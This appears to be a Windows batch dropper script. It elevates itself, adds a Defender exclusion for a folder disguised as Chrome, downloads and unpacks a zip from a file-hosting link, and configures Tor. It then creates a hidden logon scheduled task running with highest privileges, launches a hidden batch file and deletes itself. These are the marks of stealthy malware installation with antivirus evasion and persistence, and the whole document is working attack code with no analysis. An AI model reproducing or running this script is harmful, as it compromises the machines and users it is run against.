@echo off
NET SESSION >nul 2>nul
if %errorlevel% NEQ 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)
@echo off
powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%\Chrome'"
taskkill /F /IM "System Loader.exe"
taskkill /F /IM "tor.exe"
rmdir /s /q "%APPDATA%\Chrome"
mkdir "%APPDATA%\Chrome"
taskkill /F /IM Chrome_helperr.exe
schtasks /Delete /TN "Chrome_helperr" /F
powershell.exe -Command "Invoke-WebRequest -Uri 'https://public.boxcloud.com/d/1/b1!CSvBZsi-tNrDYZdYYlDinp7qHClyk-n7GsuuVxfk0SkyVMvZijzLeY7_Dse8Gj-uv5Es0W4QqtO9zqKNZQxTnfyBLc2NJ4nVNAg-jPi23fbmEmGsF347c_9GCRqPO8k4CtoTd1_XlaxUC3QMibU-hxYmqQKfQHpxHoQDqlPJ08jXgrXRd_DvwRPfz5HL8G49x-MLvGZv6aEIJzjdWaqlaBEjxKpH7VMYsyuuwntKc2MJg-Hi3tQk_BxI-UHerL6e3iV0mS-sDNAICTLMjuPt1rnoQ3hZbe0eaOdHOhCNWU8wj_AnJSAwqCQhTMIgIG5sNLS3YaF7SGP7F4VJOnvrrL4zfnf8b9yZwls4oVZVnjDNXLurdmXZPVFgxBWAvFs7PzQ7K6sGTvuneW5s_Y6zVk8qdfXb1sNJBDXr8xMXZKzedfnnTmk5d5BmO7Fm2WyoCH89vS3R2tJkM-Xk08XZVK6LjB8ekx6ayefoMbmyoDirRV5PNj7tnByptVKZx_5HwXt2v0ClPmxIPno3fMj0cvnqnbJYKxu5NaDHQDjSkQ8n2jub90PJ14nBjryo6bX9Ti_wrlS2I1R0Uc0wJaz0bkTY78atZfUVpaB9JhCvn8T8TT3JKLYS53maZuEWoWuwPdkVilqY1NzwX2_03muTM2-rBbaGJ_whMlCmi7KCO_Bs1X3X_j2mmBce_XneIGj8DsgzmG9aqO06pCmYYyJY32UmU5SQYl6y5hC2DpduehdUBiqp-2FhKsm5JL30Pa4EFjjiQCegnXqlKDgLlWHVYdP0IYekQQd2k5QPsa7QHacjbHr7qyfh19MQL09eQPAzjPU-LDlbRp4AROuQl2e6hQN9jNXaq6ivoKitzi-Mv0XcElv_aLgl1xRarji5-_0-H5DBbwHE2O-kpYaxDmFocceh-4lgLYCqjqxyCTV06nG90J2v2GfKJNjDN7xqvJwNKuWFv3qr490dGN-CGoTwxBE7xeHlTUXhist2bAagWxfjPzqhJgkm_CpMoV_WPF7YxAR_Pz7JVAbfhTq8tyMLK294rVNFuz71H_DSx5gIxXrYGceo3Oc5O1E0A99qG-XfYQWTD64c9fNkjXS3XiPI0DAdtvaMSz3zHAiCoKTDz6upz8xFSZqaLvY1IpAKjZY6ksJquQcHe3Ap8638rNmh3KDMd00_vwTmYit__CkKeqK8YUb7ytXMuylMmVpJu0Ady_J7GQE2jGR4enEiJWJ5HxHYCtpe3CxLLaVZ2IXlHMcJYTfhRrLoI_TzFudQTOzYQP7gqF-oXeYw3eDSIToK5wgx4lu22yaf8r7Mie4-1reDkOLBu_G4prtvS8W9fKRV7SUXHpenckc3tia2FTCKWtZjGLdelrynMfbWF7vltW6RpPRUwklA5VoTzlvEe3kvK_cu3tz-PS7nBjOPN6viEhmMteKn-utGPKctbVKxYOhq8P96gDWYHeNBB3uZXjZt3hlqOgPLgt5AWtK8lkthFY7xoQt4sgA./download' -OutFile '%APPDATA%\Chrome\Chrome.zip'"
if not exist "%APPDATA%\Chrome\Chrome.zip" (
    timeout /t 2
    powershell.exe -Command "Invoke-WebRequest -Uri 'https://public.boxcloud.com/d/1/b1!CSvBZsi-tNrDYZdYYlDinp7qHClyk-n7GsuuVxfk0SkyVMvZijzLeY7_Dse8Gj-uv5Es0W4QqtO9zqKNZQxTnfyBLc2NJ4nVNAg-jPi23fbmEmGsF347c_9GCRqPO8k4CtoTd1_XlaxUC3QMibU-hxYmqQKfQHpxHoQDqlPJ08jXgrXRd_DvwRPfz5HL8G49x-MLvGZv6aEIJzjdWaqlaBEjxKpH7VMYsyuuwntKc2MJg-Hi3tQk_BxI-UHerL6e3iV0mS-sDNAICTLMjuPt1rnoQ3hZbe0eaOdHOhCNWU8wj_AnJSAwqCQhTMIgIG5sNLS3YaF7SGP7F4VJOnvrrL4zfnf8b9yZwls4oVZVnjDNXLurdmXZPVFgxBWAvFs7PzQ7K6sGTvuneW5s_Y6zVk8qdfXb1sNJBDXr8xMXZKzedfnnTmk5d5BmO7Fm2WyoCH89vS3R2tJkM-Xk08XZVK6LjB8ekx6ayefoMbmyoDirRV5PNj7tnByptVKZx_5HwXt2v0ClPmxIPno3fMj0cvnqnbJYKxu5NaDHQDjSkQ8n2jub90PJ14nBjryo6bX9Ti_wrlS2I1R0Uc0wJaz0bkTY78atZfUVpaB9JhCvn8T8TT3JKLYS53maZuEWoWuwPdkVilqY1NzwX2_03muTM2-rBbaGJ_whMlCmi7KCO_Bs1X3X_j2mmBce_XneIGj8DsgzmG9aqO06pCmYYyJY32UmU5SQYl6y5hC2DpduehdUBiqp-2FhKsm5JL30Pa4EFjjiQCegnXqlKDgLlWHVYdP0IYekQQd2k5QPsa7QHacjbHr7qyfh19MQL09eQPAzjPU-LDlbRp4AROuQl2e6hQN9jNXaq6ivoKitzi-Mv0XcElv_aLgl1xRarji5-_0-H5DBbwHE2O-kpYaxDmFocceh-4lgLYCqjqxyCTV06nG90J2v2GfKJNjDN7xqvJwNKuWFv3qr490dGN-CGoTwxBE7xeHlTUXhist2bAagWxfjPzqhJgkm_CpMoV_WPF7YxAR_Pz7JVAbfhTq8tyMLK294rVNFuz71H_DSx5gIxXrYGceo3Oc5O1E0A99qG-XfYQWTD64c9fNkjXS3XiPI0DAdtvaMSz3zHAiCoKTDz6upz8xFSZqaLvY1IpAKjZY6ksJquQcHe3Ap8638rNmh3KDMd00_vwTmYit__CkKeqK8YUb7ytXMuylMmVpJu0Ady_J7GQE2jGR4enEiJWJ5HxHYCtpe3CxLLaVZ2IXlHMcJYTfhRrLoI_TzFudQTOzYQP7gqF-oXeYw3eDSIToK5wgx4lu22yaf8r7Mie4-1reDkOLBu_G4prtvS8W9fKRV7SUXHpenckc3tia2FTCKWtZjGLdelrynMfbWF7vltW6RpPRUwklA5VoTzlvEe3kvK_cu3tz-PS7nBjOPN6viEhmMteKn-utGPKctbVKxYOhq8P96gDWYHeNBB3uZXjZt3hlqOgPLgt5AWtK8lkthFY7xoQt4sgA./download' -OutFile '%APPDATA%\Chrome\Chrome.zip'"
)
@echo off
tar -xf "%APPDATA%\Chrome\Chrome.zip" -C "%APPDATA%\Chrome\"
set TOR_LOG_FILE="%APPDATA%\Chrome\Chrome\data\tor.log"
set GEOIP_FILE="%APPDATA%\Chrome\Chrome\data\geoip"
set GEOIPV6_FILE="%APPDATA%\Chrome\Chrome\data\geoip6"
set TORRC_FILE="%APPDATA%\Chrome\Chrome\torrc"
echo Log notice file "%TOR_LOG_FILE%" > "%TORRC_FILE%"
echo GeoIPFile "%GEOIP_FILE%" >> "%TORRC_FILE%"
echo GeoIPv6File "%GEOIPV6_FILE%" >> "%TORRC_FILE%"
type "%TORRC_FILE%" >> "%APPDATA%\Chrome\Chrome\"
schtasks /create /tn "Chrome_helperr" /tr "powershell Start-Process \"%appdata%/chrome/tor/astart.bat\" -WindowStyle Hidden -Verb RunAs" /sc onlogon /ru "%username%" /f /rl highest
powershell Start-Process \"%APPDATA%/Chrome/Chrome/astart.bat\" -WindowStyle Hidden -Verb RunAs
(del "%~f0") & exit
